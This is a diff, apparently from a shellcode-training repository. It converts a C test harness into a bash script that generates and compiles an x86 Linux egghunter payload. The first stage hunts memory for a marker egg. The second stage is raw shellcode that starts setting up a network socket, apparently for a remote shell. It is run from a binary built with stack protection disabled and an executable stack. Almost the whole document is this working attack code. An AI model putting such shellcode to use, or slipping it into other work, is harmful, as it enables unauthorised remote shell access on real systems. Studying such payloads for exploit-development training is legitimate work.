@@ -1,15 +1,21 @@
+#!/usr/bin/env -S bash -x
+# Author: @bugsam
+# Date: 07/13/2020 
+FILE=$0
+
+EGG='"\x99\x90\x99\x90"'
+
+echo "[+] Creating C source"
+cat << EOF > $FILE.c
 #include <stdio.h>
 #include <string.h>
 
-#define EGG "\x99\x90\x99\x90"
-
 unsigned char first_stage[] = "\x29\xd2\x29\xc9\xbb"
-EGG
+${EGG}
 "\x29\xc0\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0"
 "\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39"
 "\x5a\x04\x75\xe9\xff\xe2";
-unsigned char second_stage[] = \
-EGG EGG
+unsigned char second_stage[] = ${EGG} ${EGG}
 "\x31\xff\x31\xd2\x31\xdb\x31\xc0\x52\x6a\x01\x6a\x02"
 "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x31\xd2\x52\x66\xba"
 "\x05\x39\xc1\xe2\x10\xb2\x02\x52\x89\xe1\x6a\x10\x51"
@@ -29,3 +35,7 @@ int main (){
 
         ret();
 }
+EOF
+
+echo "[+] Compiling C code"
+gcc -fno-stack-protector -zexecstack -o ${FILE}_elf ${FILE}.c
